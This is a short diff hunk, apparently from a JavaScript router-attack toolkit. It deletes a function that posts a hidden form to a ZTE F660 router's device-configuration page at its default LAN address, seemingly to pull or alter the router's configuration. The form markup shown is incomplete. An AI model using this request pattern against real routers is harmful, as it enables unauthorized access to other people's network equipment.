@@ -2376,11 +2376,3 @@ function belkinwpspin()
 
 }
 
-function ztef660_config(ip)
-{
-	ip = ip || "192.168.1.1";
-	var form = '<input type="hidden" name="config" id="config" value="">';
-	form += '</form>';
-	post('http://' + ip + '/getpage.gch?pid=101&nextpage=manager_dev_config_t.gch', form);
-}
-
